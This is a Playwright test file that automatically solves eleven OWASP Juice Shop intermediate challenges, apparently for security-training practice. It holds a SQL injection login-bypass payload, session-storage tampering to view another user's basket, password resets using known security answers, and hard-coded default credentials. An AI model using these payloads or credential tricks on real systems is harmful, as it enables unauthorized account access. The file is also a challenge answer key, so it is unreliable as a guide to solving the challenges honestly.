import { test, expect, Page } from '@playwright/test';
import { LoginPage } from '../src/pages/LoginPage';
import { RegistrationPage } from '../src/pages/RegistrationPage';
import { ResetPassword } from '../src/pages/ResetPassword';
import { HeaderBar } from '../src/pages/HeaderBar';
import { SideNav } from '../src/pages/SideNav';
import { Complaint } from '../src/pages/Complaint';
import { FirstVisitPopups } from '../src/pages/FirstVisitPopups';
import { ChallengeValidator } from '../src/helpers/challengeValidator';
import { TestDataGenerator } from '../src/helpers/testDataGenerator';

let page: Page;
let loginPage: LoginPage;
let registrationPage: RegistrationPage;
let resetPassword: ResetPassword;
let headerBar: HeaderBar;
let sideNav: SideNav;
let complaint: Complaint;
let firstVisitPopups: FirstVisitPopups;
let challengeValidator: ChallengeValidator;

test.beforeEach(async ({ page: testPage }) => {
  page = testPage;
  loginPage = new LoginPage(page);
  registrationPage = new RegistrationPage(page);
  resetPassword = new ResetPassword(page);
  headerBar = new HeaderBar(page);
  sideNav = new SideNav(page);
  complaint = new Complaint(page);
  firstVisitPopups = new FirstVisitPopups(page);
  challengeValidator = new ChallengeValidator(page);

  await page.goto('/');
  try {
    await firstVisitPopups.dismissAllPopups();
  } catch (e) {
    // Popups might not be present
  }
});

/**
 * OWASP JuiceShop - 2 Stars Challenges (Vulnerability Level: Medium)
 * These are intermediate security vulnerabilities
 */
test.describe('2-Stars Security Challenges', () => {
  test('1 - Login Admin - SQL Injection', async () => {
    // SQL Injection attack to bypass login
    const sqlInjectionPayload = "' OR '1'='1'--";
    await loginPage.login(sqlInjectionPayload, ' ');

    await page.waitForTimeout(1000);
    await challengeValidator.assertChallengeSolved('Login Admin');
  });

  test('2 - Admin Section - Hidden Route', async () => {
    const sqlInjectionPayload = "' OR '1'='1'--";
    await loginPage.login(sqlInjectionPayload, ' ');
    await page.goto('/#/administration');

    await challengeValidator.assertChallengeSolved('Admin Section');
  });

  test('3 - View Basket - Session Manipulation', async () => {
    const sqlInjectionPayload = "' OR '1'='1'--";
    await loginPage.login(sqlInjectionPayload, ' ');

    await headerBar.basketButton.click();

    // Manipulate sessionStorage to view different basket
    await page.evaluate(() => {
      sessionStorage.setItem('bid', '2');
    });

    await page.reload();
    await page.waitForTimeout(1000);

    await challengeValidator.assertChallengeSolved('View Basket');
  });

  test('4 - Five-Star Feedback - Admin Manipulation', async () => {
    const sqlInjectionPayload = "' OR '1'='1'--";
    await loginPage.login(sqlInjectionPayload, ' ');

    // Navigate to admin panel
    await page.goto('/#/administration');

    // Wait for feedbacks API
    await page.waitForResponse(response =>
      response.url().includes('/api/Feedbacks/') && response.status() === 200
    );

    // Get all feedback rows with 5-star rating (5 mat-icons)
    const feedbackRows = page.locator("div[class='customer-table'] mat-row");
    const count = await feedbackRows.count();

    for (let i = 0; i < count; i++) {
      const row = feedbackRows.nth(i);
      const icons = row.locator('mat-icon');
      const iconCount = await icons.count();

      // Delete if has 5 stars
      if (iconCount === 5) {
        const deleteButton = row.locator('button').first();
        await deleteButton.click();
        await page.waitForTimeout(300);
      }
    }

    await challengeValidator.assertChallengeSolved('Five-Star Feedback');
  });

  test('5 - Meta Geo Stalking - Password Reset', async () => {
    const johnEmail = 'john@juice-sh.op';
    const newPassword = 'newPassword123.';
    const securityAnswer = 'Daniel Boone National Forest';

    await resetPassword.resetPassword(johnEmail, newPassword, securityAnswer);
    await page.waitForTimeout(1000);

    await challengeValidator.assertChallengeSolved('Meta Geo Stalking');
  });

  test('6 - Deprecated Interface - File Upload', async () => {
    const userData = TestDataGenerator.generateTestUser();

    await registrationPage.register(userData);
    await loginPage.login(userData.email, userData.password);

    // Navigate to complaint and upload file
    await sideNav.navigateToComplaint();
    await complaint.sendComplaint('Test complaint message', './fixtures/test1.xml');

    await page.waitForTimeout(1000);
    await challengeValidator.assertChallengeSolved('Deprecated Interface');
  });

  test('7 - Login MC SafeSearch - Known Credentials', async () => {
    const mcSafeSearchEmail = 'mc.safesearch@juice-sh.op';
    const mcSafeSearchPassword = 'Mr. N00dles';

    await loginPage.login(mcSafeSearchEmail, mcSafeSearchPassword);
    await page.waitForTimeout(1000);

    await challengeValidator.assertChallengeSolved('Login MC SafeSearch');
  });

  test('8 - Password Strength - Known Credentials', async () => {
    const adminEmail = 'admin@juice-sh.op';
    const adminPassword = 'admin123';

    await loginPage.login(adminEmail, adminPassword);
    await page.waitForTimeout(1000);

    await challengeValidator.assertChallengeSolved('Password Strength');
  });

  test('9 - Security Policy - Hidden Endpoint', async () => {
    const response = await page.request.get('/.well-known/security.txt');
    expect(response.status()).toBe(200);

    await challengeValidator.assertChallengeSolved('Security Policy');
  });

  test('10 - Weird Crypto - Feedback Submission', async () => {
    await sideNav.navigateToCustomerFeedback();

    // Get CAPTCHA
    const captchaResponse = await page.request.get('/rest/captcha/');
    const captchaBody = await captchaResponse.json();

    // Submit feedback with "base64" comment
    await page.request.post('/api/Feedbacks/', {
      data: {
        captchaId: captchaBody.captchaId,
        captcha: captchaBody.answer,
        comment: 'base64',
        rating: 2
      }
    });

    await challengeValidator.assertChallengeSolved('Weird Crypto');
  });

  test('11 - Visual Geo Stalking - Password Reset', async () => {
    const emmaEmail = 'emma@juice-sh.op';
    const newPassword = 'newPassword123.';
    const securityAnswer = 'ITsec';

    await resetPassword.resetPassword(emmaEmail, newPassword, securityAnswer);
    await page.waitForTimeout(1000);

    await challengeValidator.assertChallengeSolved('Visual Geo Stalking');
  });
});
